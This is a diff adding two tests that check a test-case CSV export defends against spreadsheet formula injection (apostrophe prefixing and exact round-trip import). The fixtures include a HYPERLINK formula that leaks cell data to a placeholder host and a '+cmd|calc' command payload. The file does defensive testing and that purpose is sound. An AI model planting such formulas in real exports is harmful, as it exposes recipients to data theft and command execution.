@@ -109,6 +109,69 @@ describe('выгрузка кейсов', () => {
     }
   });
 
+  /**
+   * Excel считает формулой и значение в кавычках: `"=HYPERLINK(…)"` из заголовка,
+   * написанного агентом или пришедшего из чужого CSV, у получателя выгрузки
+   * становится ссылкой наружу. Апостроф впереди делает ячейку текстом, а импорт
+   * снимает его обратно — выгрузка по-прежнему читается той же.
+   */
+  it('CSV не отдаёт формулу: ячейка с = + - @ начинается с апострофа и читается обратно', () => {
+    const formula = '=HYPERLINK("http://x.test/?d="&A1,"open")';
+    writeGroupFile(root, [
+      { ...RICH, title: formula, purpose: '+cmd|calc', oracle: '@SUM(1+1)', expected: '-1' },
+    ]);
+    const csv = toCsv(readGroups(root)[0]!);
+
+    expect(csv).toContain(`"'=HYPERLINK(""http://x.test/?d=""&A1,""open"")"`);
+    expect(csv).toContain("'+cmd|calc");
+    expect(csv).toContain("'@SUM(1+1)");
+    expect(csv).toContain(",'-1,");
+    expect(csv).not.toMatch(/(^|,)"?[=+@]/m);
+
+    const copy = mkdtempSync(join(tmpdir(), 'cc-roundtrip-'));
+    try {
+      createGroup(copy, 'gui');
+      importCases(copy, { format: 'csv', groupId: 'gui', content: csv, now: NOW });
+      expect(readGroups(copy)[0]?.cases[0]).toMatchObject({
+        title: formula,
+        purpose: '+cmd|calc',
+        oracle: '@SUM(1+1)',
+        expected: '-1',
+      });
+    } finally {
+      rmSync(copy, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
+    }
+  });
+
+  /**
+   * F-137: апостроф, который написал человек, — данные, а не защита. Импорт
+   * снимал ЛЮБОЙ `'` перед символом формулы, и `'=буквально` возвращался как
+   * `=буквально`. Теперь выгрузка ставит защиту и перед таким значением, а
+   * импорт снимает ровно одну — туда и обратно байт в байт.
+   */
+  it('апостроф автора переживает выгрузку и импорт байт в байт', () => {
+    const values = {
+      title: "'=literal apostrophe",
+      purpose: "''+два апострофа",
+      oracle: "'просто апостроф",
+      expected: "'",
+    };
+    writeGroupFile(root, [{ ...RICH, ...values }]);
+    const csv = toCsv(readGroups(root)[0]!);
+    // Защищено и значение, уже начатое апострофом перед формулой.
+    expect(csv).toContain("''=literal apostrophe");
+    expect(csv).not.toMatch(/(^|,)"?[=+@]/m);
+
+    const copy = mkdtempSync(join(tmpdir(), 'cc-roundtrip-'));
+    try {
+      createGroup(copy, 'gui');
+      importCases(copy, { format: 'csv', groupId: 'gui', content: csv, now: NOW });
+      expect(readGroups(copy)[0]?.cases[0]).toMatchObject(values);
+    } finally {
+      rmSync(copy, { recursive: true, force: true, maxRetries: 10, retryDelay: 100 });
+    }
+  });
+
   it('книга Excel читается обратно как таблица', () => {
     const rows = readXlsx(toXlsx(readGroups(root)[0]!, AT));
 
